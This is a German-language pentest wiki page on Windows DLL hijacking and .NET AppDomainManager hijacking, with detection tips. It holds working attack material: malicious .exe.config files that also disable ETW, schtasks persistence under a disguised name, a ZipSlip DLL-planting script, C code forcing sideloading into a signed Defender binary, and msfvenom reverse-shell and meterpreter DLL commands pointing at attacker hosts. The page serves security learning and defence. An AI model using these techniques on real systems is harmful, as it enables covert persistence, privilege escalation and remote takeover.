# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking umfasst die Manipulation einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection und Side-Loading**. Es wird hauptsächlich für Codeausführung und Persistenz sowie seltener für Privilege Escalation eingesetzt. Obwohl der Fokus hier auf der Rechteausweitung liegt, bleibt die Methode des Hijackings unabhängig vom Ziel gleich.

### Häufige Techniken

Für DLL Hijacking werden mehrere Methoden eingesetzt, wobei ihre Effektivität von der DLL-Ladestrategie der Anwendung abhängt:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL beizubehalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL, wobei das Suchmuster der Anwendung ausgenutzt wird.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die von einer Anwendung geladen wird, weil diese davon ausgeht, dass es sich um eine nicht vorhandene, erforderliche DLL handelt.
4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest`- / `.exe.local`-Dateien, um die Anwendung zur bösartigen DLL zu leiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis; diese Methode wird häufig mit DLL side-loading in Verbindung gebracht.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich den Techniken zur Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading ist nicht die einzige Möglichkeit, einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, Code eines Angreifers zu laden. Wenn die Zieldatei eine **managed** Anwendung ist, konsultiert die CLR außerdem eine **application configuration file**, die nach der ausführbaren Datei benannt ist (zum Beispiel `Setup.exe.config`). Diese Datei kann einen benutzerdefinierten **AppDomainManager** definieren. Wenn die Konfiguration auf eine vom Angreifer kontrollierte Assembly verweist, die neben der EXE platziert wurde, lädt die CLR sie **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.<sup>[[24]](#references)</sup>

Gemäß dem Konfigurationsschema von Microsoft für .NET Framework müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale Konfiguration:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimaler Manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktische Hinweise:
- Dies ist eine **.NET Framework-spezifische** Technik. Sie hängt von der Konfigurationsanalyse durch die CLR ab, nicht von der DLL-Suchreihenfolge von Win32.
- Der Host muss tatsächlich eine **managed EXE** sein. Schnelle Triage: `sigcheck -m target.exe`, `corflags target.exe` oder in den PE-Metadaten nach dem **CLR Runtime Header** suchen.
- Der Name der Konfigurationsdatei muss exakt mit dem Namen der ausführbaren Datei übereinstimmen (`<binary>.config`) und befindet sich normalerweise **neben der EXE**.
- Dies ist bei **signierten Microsoft-/Vendor-Binaries** nützlich, da die vertrauenswürdige EXE unverändert bleibt, während die schädliche managed Assembly innerhalb desselben Prozesses ausgeführt wird.
- Wenn du bereits über ein beschreibbares Installer-/Update-Verzeichnis verfügst, kann AppDomainManager hijacking als **erste Stufe** verwendet werden, gefolgt von klassischem DLL sideloading oder reflective loading für spätere Stufen.

### AppDomainManager als Downloader + Bootstrap für eine geplante Aufgabe

Ein praktisches Intrusionsmuster besteht darin, die vertrauenswürdige managed EXE sowohl mit einer schädlichen `*.config` als auch mit einer schädlichen AppDomainManager-DLL zu kombinieren, die ausschließlich als **kleiner Bootstrapper** fungiert:<sup>[[25]](#references)</sup>

1. Der Benutzer startet einen signierten .NET-Installer oder Updater von einem glaubwürdigen Speicherort wie `%USERPROFILE%\Downloads`.
2. Die nebenliegende Konfiguration veranlasst die CLR, die Assembly des Angreifers zu laden, **bevor** die Logik der legitimen Anwendung startet.
3. Der schädliche Manager führt eine **Pfadprüfung** durch (beispielsweise nur fortfahren, wenn die Host-EXE aus `Downloads` ausgeführt wird, und die Ausführung der zweiten Stufe nur aus `%LOCALAPPDATA%` zulassen).
4. Wenn die Prüfung erfolgreich ist, lädt er die eigentliche Payload in einen benutzerbeschreibbaren Pfad wie `%LOCALAPPDATA%\PerfWatson2.exe` herunter und richtet mit einer geplanten Aufgabe Persistenz ein.

Warum diese Variante relevant ist:
- Die signierte Host-EXE bleibt unverändert, sodass eine Triage, die ausschließlich den Hash der Haupt-Binary prüft, den Kompromiss möglicherweise nicht erkennt.
- Einfache **pfadbasierte Anti-Analyse** ist üblich: Das Verschieben des ZIP/EXE/DLL-Trios auf den Desktop, in einen Temp- oder einen Sandbox-Pfad kann die Kette absichtlich unterbrechen.
- Die AppDomainManager-DLL der ersten Stufe kann klein und unauffällig bleiben, während das eigentliche Implantat später abgerufen wird.

Minimales Persistenzbeispiel, das bei diesem Muster häufig zu sehen ist:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Hinweise:
- ` /rl highest` bedeutet **höchste verfügbare Berechtigungsstufe** für den jeweiligen Benutzer/die jeweilige Sitzung; dies garantiert für sich allein keine SYSTEM-Eskalation.
- Diese Technik wird häufig eher als **Ausführung/Persistenz durch Missbrauch der .NET-Konfiguration** denn als klassisches Hijacking der Suchreihenfolge einer fehlenden DLL eingeordnet, obwohl Operatoren beides häufig miteinander verknüpfen.

Erkennungsansätze:
- Signierte .NET-Executables, die aus **ZIP-Extraktionspfaden**, `Downloads`, `%TEMP%` oder anderen benutzerschreibbaren Ordnern gestartet werden und über eine **im selben Verzeichnis liegende** `<exe>.config` verfügen.
- Neue geplante Aufgaben, deren Aktion auf `%LOCALAPPDATA%`, `%APPDATA%` oder `Downloads` verweist und deren Namen Browser-/Vendor-Updater imitieren.
- Kurzlebige verwaltete Bootstrap-Prozesse, die sofort ein weiteres EXE herunterladen und anschließend `schtasks.exe` starten.
- Samples, die vorzeitig beendet werden, sofern der Pfad des Executables nicht einem erwarteten Benutzerprofilverzeichnis entspricht.

### Hijacking einer bestehenden geplanten Aufgabe zum erneuten Start der Sideload-Kette

Für Persistenz sollte man nicht nur nach dem **Erstellen einer neuen Aufgabe** suchen. Einige Intrusion Sets warten, bis ein legitimer Installer eine **normale Updater-Aufgabe** erstellt, und **schreiben anschließend die Aufgabenaktion um**, sodass Name, Autor und Trigger für die Defender vertraut bleiben.

Wiederverwendbarer Workflow:
1. Installieren/Starten Sie die legitime Software und identifizieren Sie die Aufgabe, die sie normalerweise erstellt.
2. Exportieren Sie die Aufgaben-XML und notieren Sie die aktuellen Werte von `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Ersetzen Sie ausschließlich die Aktion, sodass die Aufgabe Ihre **vertrauenswürdige Host-EXE** aus einem benutzerschreibbaren Staging-Verzeichnis startet, die anschließend das eigentliche Payload per Sideload oder AppDomain lädt.
4. Registrieren Sie denselben Aufgabennamen erneut, anstatt ein neues, auffälliges Persistenzartefakt zu erstellen.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Warum es unauffälliger ist:
- Der Aufgabenname kann weiterhin legitim wirken (zum Beispiel ein Updater eines Anbieters).
- Der **Task Scheduler-Dienst** startet ihn, sodass die Validierung von Parent/Ancestor häufig die erwartete Scheduling-Kette statt `explorer.exe` sieht.
- DFIR-Teams, die nur nach **neuen Aufgabennamen** suchen, können eine Aufgabe übersehen, deren Registrierung bereits existierte, deren Aktion jetzt jedoch auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad verweist.

Schnelle Hunting-Ansatzpunkte:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche die XML-Dateien unter `C:\Windows\System32\Tasks\*` und die Metadaten unter `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` mit einer Baseline.
- Erzeuge einen Alert, wenn eine **wie ein Anbieter-Updater aussehende Aufgabe** aus **benutzerbeschreibbaren Verzeichnissen** ausgeführt wird oder eine .NET-EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML-Staging, AES-CTR-Konfigurationen und .NET-Implants auf DLL-Sideloading aufsetzt, prüfe den folgenden Workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Die häufigste Methode, fehlende DLLs innerhalb eines Systems zu finden, besteht darin, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals auszuführen und die **folgenden 2 Filter** zu **setzen**:

![Common Techniques - Fehlende DLLs finden: Die häufigste Methode, fehlende DLLs innerhalb eines Systems zu finden, besteht darin, procmon von sysinternals auszuführen und die folgenden 2 Filter zu setzen](<../../../images/image (961).png>)

![Common Techniques - Fehlende DLLs finden: Die häufigste Methode, fehlende DLLs innerhalb eines Systems zu finden, besteht darin, procmon von sysinternals auszuführen und die folgenden 2 Filter zu setzen](<../../../images/image (230).png>)

und nur die **File System Activity** anzuzeigen:

![Common Techniques - Fehlende DLLs finden: und nur die File System Activity anzuzeigen](<../../../images/image (153).png>)

Wenn du nach **fehlenden DLLs im Allgemeinen** suchst, **lässt du** dies einige **Sekunden** laufen.\
Wenn du nach einer **fehlenden DLL innerhalb einer bestimmten ausführbaren Datei** suchst, setze einen weiteren Filter wie **"Process Name" "contains" `<exec name>`**, führe sie aus und stoppe die Ereigniserfassung.<sup>[[9]](#references)</sup>

## Fehlende DLLs ausnutzen

Um Privilegien zu eskalieren, suche nach einer **DLL, die ein privilegierter Prozess** aus einem Verzeichnis zu laden versucht, in das du schreiben kannst. Dies kann passieren, wenn du ein Verzeichnis kontrollierst, das vor dem Verzeichnis mit der legitimen DLL durchsucht wird, oder wenn die angeforderte DLL nicht existiert und du in eines der durchsuchten Verzeichnisse schreiben kannst.

### DLL-Suchreihenfolge

**In der** [**Microsoft-Dokumentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **findest du, wie DLLs genau geladen werden.**

**Windows-Anwendungen** suchen nach DLLs, indem sie eine Reihe **vordefinierter Suchpfade** in einer bestimmten Reihenfolge durchlaufen. Das Problem des DLL-Hijackings entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Möglichkeit, dies zu verhindern, besteht darin, sicherzustellen, dass die Anwendung beim Verweisen auf benötigte DLLs absolute Pfade verwendet.

Die **DLL-Suchreihenfolge auf 32-Bit**-Systemen sieht wie folgt aus:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die Funktion [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), um den Pfad dieses Verzeichnisses abzurufen.(_C:\Windows\System32_)
3. Das 16-Bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses abruft, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die Funktion [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), um den Pfad dieses Verzeichnisses abzurufen.
1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachte, dass dies nicht den anwendungsspezifischen Pfad einschließt, der durch den Registrierungsschlüssel **App Paths** festgelegt wird. Der Schlüssel **App Paths** wird bei der Berechnung des DLL-Suchpfads nicht verwendet.

Dies ist die **Standardsuchreihenfolge**, wenn **SafeDllSearchMode** aktiviert ist. Wenn es deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz vor. Um diese Funktion zu deaktivieren, erstelle den Registrierungswert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (standardmäßig aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Schließlich kann eine DLL über einen absoluten Pfad statt über ihren Namen geladen werden. In diesem Fall sucht Windows nur an diesem Pfad nach der DLL selbst; Abhängigkeiten, die über ihren Namen angefordert werden, folgen weiterhin der geltenden Suchreihenfolge.

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu verändern, aber ich werde sie hier nicht erklären.

### Eine beliebige Dateischreibprimitive in einen Missing-DLL-Hijack umwandeln

1. Verwende **ProcMon**-Filter (`Process Name` = Ziel-EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, nach denen der Prozess sucht, die er aber nicht finden kann.<sup>[[14]](#references)</sup>
2. Wenn die Binärdatei über einen **Zeitplan/einen Dienst** ausgeführt wird, wird eine DLL mit einem dieser Namen, die im **Anwendungsverzeichnis** (Eintrag Nr. 1 der Suchreihenfolge) abgelegt wird, bei der nächsten Ausführung geladen. In einem Fall mit einem .NET-Scanner suchte der Prozess nach `hostfxr.dll` in `C:\samples\app\`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. eine Reverse Shell) mit einem beliebigen Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn deine Primitive ein **ZipSlip-artiger beliebiger Schreibzugriff** ist, erstelle ein ZIP, dessen Eintrag das Extraktionsverzeichnis verlässt, sodass die DLL im Anwendungsordner landet:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Übermittle das Archiv an den überwachten Posteingang/Share; wenn die geplante Aufgabe den Prozess erneut startet, lädt er die schädliche DLL und führt deinen Code als Dienstkonto aus.

### Erzwingen von sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Möglichkeit, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, beim Erstellen des Prozesses mit den nativen APIs von ntdll das Feld DllPath in RTL_USER_PROCESS_PARAMETERS zu setzen. Durch die Angabe eines vom Angreifer kontrollierten Verzeichnisses kann ein Zielprozess, der eine importierte DLL anhand ihres Namens auflöst (kein absoluter Pfad und keine Verwendung der sicheren Lade-Flags), gezwungen werden, eine schädliche DLL aus diesem Verzeichnis zu laden.

Kernidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner verweist (z. B. das Verzeichnis, in dem sich dein Dropper/Unpacker befindet).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn die Zieldatei eine DLL anhand ihres Namens auflöst, konsultiert der Loader den bereitgestellten DllPath während der Auflösung. Dadurch wird zuverlässiges sideloading ermöglicht, selbst wenn sich die schädliche DLL nicht im selben Verzeichnis wie die Ziel-EXE befindet.

Hinweise/Einschränkungen
- Dies betrifft den untergeordneten Prozess, der erstellt wird; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess betrifft.
- Das Ziel muss eine DLL anhand ihres Namens importieren oder mit LoadLibrary laden (kein absoluter Pfad und keine Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest codierte absolute Pfade können nicht hijacked werden. Weitergeleitete Exporte und SxS können die Priorität ändern.

Minimales C-Beispiel (ntdll, Wide-Strings, vereinfachte Fehlerbehandlung):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von DLL sideloading über RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Beispiel für die praktische Nutzung
- Platziere eine bösartige xmllite.dll (die erforderlichen Funktionen exportierend oder als Proxy für die echte DLL) in deinem DllPath-Verzeichnis.
- Starte eine signierte Binary, von der bekannt ist, dass sie mithilfe der oben beschriebenen Technik nach xmllite.dll anhand ihres Namens sucht. Der Loader löst den Import über den angegebenen DllPath auf und sideloaded deine DLL.

Diese Technik wurde in-the-wild beobachtet, um mehrstufige sideloading-Ketten anzutreiben: Ein initialer Launcher legt eine Helper-DLL ab, die anschließend eine von Microsoft signierte, hijackbare Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem Staging-Verzeichnis zu erzwingen.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Bei **.NET Framework**-Zielen kann sideloading **vor `Main()`** erfolgen, ohne den Speicher zu patchen, indem die an die Anwendung angrenzende **`.exe.config`**-Datei missbraucht wird. Anstatt sich ausschließlich auf die Win32-DLL-Suchreihenfolge zu verlassen, platziert der Angreifer eine legitime .NET-EXE neben einer bösartigen Konfiguration und einer oder mehreren vom Angreifer kontrollierten Assemblies.

So funktioniert die Kette:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die Host-EXE startet und die **CLR liest `<exe>.config`**.
2. Die Konfiguration setzt **`<appDomainManagerAssembly>`** und **`<appDomainManagerType>`**, sodass die Runtime einen vom Angreifer kontrollierten `AppDomainManager` instanziiert.
3. Der bösartige Manager erhält **eine Ausführung vor `Main()`** innerhalb des vertrauenswürdigen Host-Prozesses.
4. Dieselbe Konfiguration kann die CLR dazu zwingen, zunächst lokale Assemblies aufzulösen (zum Beispiel `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), und kann die Runtime-Validierung bzw. Telemetrie ohne Inline-Patching abschwächen.

Kampagnenartiges Muster (die genaue Verschachtelung kann je nach Direktive / CLR-Version variieren):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Warum dies nützlich ist:
- **`<probing privatePath="."/>`** hält die Assembly-Auflösung im Anwendungsverzeichnis und macht den Ordner zu einer vorhersehbaren Sideloading-Angriffsfläche.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verlagern die Ausführung während der CLR-Initialisierung in den Angreifercode, bevor die legitime Anwendungslogik ausgeführt wird.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kann es einer Full-Trust-Anwendung ermöglichen, unsignierte oder manipulierte Assemblies zu laden, ohne dass eine Strong-Name-Validierung fehlschlägt.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** vermeidet Publisher-Policy-Umleitungen auf neuere Assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** macht die Runtime-Auswahl deterministischer.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** ist besonders interessant, weil die **CLR ihre eigene ETW-Sichtbarkeit** über die Konfiguration deaktiviert, anstatt dass das Implantat `EtwEventWrite` im Speicher patcht.

In aktuellen Kampagnen beobachtetes Vorgehensmuster:
- Stufe 1 legt `setup.exe`, `setup.exe.config` und lokale Assemblies ab.
- Stufe 2 kopiert sie in einen glaubwürdigen **AppData-Update**-Ordner, benennt den Host in etwas wie `update.exe` um und startet ihn über eine **geplante Aufgabe** erneut.
- Stufe 3 überprüft den Ausführungskontext (beispielsweise den erwarteten übergeordneten Prozess `svchost.exe` vom Task Scheduler), bevor die finale RAT-DLL bzw. der finale Export geladen wird.

Ansätze für die Suche:
- Signierte oder anderweitig legitime **.NET-Executables**, die mit verdächtigen angrenzenden **`.config`**-Dateien an vom Benutzer beschreibbaren Speicherorten ausgeführt werden.
- `.config`-Dateien mit **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** oder **`etwEnable enabled="false"`**.
- Geplante Aufgaben, die umbenannte Update-Binaries aus **`%LOCALAPPDATA%`** oder anwendungsspezifischen `\bin\update\`-Verzeichnissen erneut starten.
- Übergeordnete/untergeordnete Prozessketten, in denen eine geplante Aufgabe einen vertrauenswürdigen .NET-Host startet, der unmittelbar nicht vom Anbieter stammende Assemblies aus seinem eigenen Verzeichnis lädt.

#### Ausnahmen bei der DLL-Suchreihenfolge aus der Windows-Dokumentation

Bestimmte Ausnahmen von der standardmäßigen DLL-Suchreihenfolge werden in der Windows-Dokumentation beschrieben:

- Wenn eine **DLL, die denselben Namen wie eine bereits im Speicher geladene DLL hat**, gefunden wird, umgeht das System die übliche Suche. Stattdessen prüft es zunächst auf Redirects und ein Manifest, bevor es standardmäßig die bereits im Speicher befindliche DLL verwendet. **In diesem Szenario führt das System keine Suche nach der DLL durch**.
- Wenn die DLL für die aktuelle Windows-Version als **bekannte DLL** erkannt wird, verwendet das System seine Version der bekannten DLL zusammen mit allen abhängigen DLLs, **wobei der Suchvorgang entfällt**. Der Registrierungsschlüssel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** enthält eine Liste dieser bekannten DLLs.
- Wenn eine **DLL Abhängigkeiten besitzt**, wird die Suche nach diesen abhängigen DLLs so durchgeführt, als wären sie ausschließlich durch ihre **Modulnamen** angegeben worden, unabhängig davon, ob die ursprüngliche DLL über einen vollständigen Pfad identifiziert wurde.

### Privilegien eskalieren

**Voraussetzungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** ausgeführt wird oder ausgeführt werden wird (horizontale oder laterale Bewegung) und dem eine **DLL** fehlt.
- Stelle sicher, dass **Schreibzugriff** auf jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** gesucht wird. Dies kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis innerhalb des Systempfads sein.

Diese Voraussetzungen sind standardmäßig selten erfüllt: Privilegierte Executables haben normalerweise keine fehlenden DLL-Abhängigkeiten, und Standardbenutzer können normalerweise nicht in Systemverzeichnisse schreiben, die im Suchpfad liegen. Fehlkonfigurierte Umgebungen können jedoch beide Bedingungen erfüllen.\
Wenn die Voraussetzungen erfüllt sind, sieh dir das [UACME](https://github.com/hfiref0x/UACME)-Projekt an. Obwohl sein Hauptziel der UAC-Bypass ist, enthält es DLL-Hijacking-PoCs für bestimmte Windows-Versionen, die häufig an das von dir gefundene beschreibbare Verzeichnis angepasst werden können.

Beachte, dass du deine **Berechtigungen in einem Ordner** folgendermaßen **prüfen** kannst:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **überprüfe die Berechtigungen aller Ordner innerhalb von PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die Imports einer ausführbaren Datei und die Exports einer DLL mit Folgendem überprüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking zur Privilege Escalation** mit Schreibberechtigungen in einem **System Path-Ordner missbraucht**, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibberechtigungen für einen beliebigen Ordner innerhalb des System PATH hast.\
Weitere interessante automatisierte Tools zum Entdecken dieser Schwachstelle sind **PowerSploit-Funktionen**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, wäre es für eine erfolgreiche Ausnutzung besonders wichtig, **eine DLL zu erstellen, die mindestens alle Funktionen exportiert, die die ausführbare Datei daraus importieren wird**. Beachte jedoch, dass Dll Hijacking nützlich ist, um von der mittleren Integritätsstufe zur hohen Integritätsstufe **(unter Umgehung der UAC)** zu eskalieren oder von der[ **hohen Integritätsstufe zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine gültige DLL erstellt**, findest du in dieser auf Dll Hijacking zur Ausführung fokussierten Studie über Dll Hijacking: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **grundlegende DLL-Codes**, die als **Vorlagen** oder zum Erstellen einer **DLL mit exportierten, nicht erforderlichen Funktionen** nützlich sein können.

## **DLLs erstellen und kompilieren**

### **Dll Proxifying**

Grundsätzlich ist ein **DLL-Proxy** eine DLL, die beim **Laden deinen schädlichen Code ausführen**, aber auch **freigeben** und so **funktionieren** kann, wie es **erwartet** wird, indem sie alle Aufrufe an die echte Bibliothek **weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine ausführbare Datei angeben und die Bibliothek auswählen**, die du proxifizieren möchtest, und eine **proxifizierte DLL generieren**, oder die **DLL angeben** und eine **proxifizierte DLL generieren**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
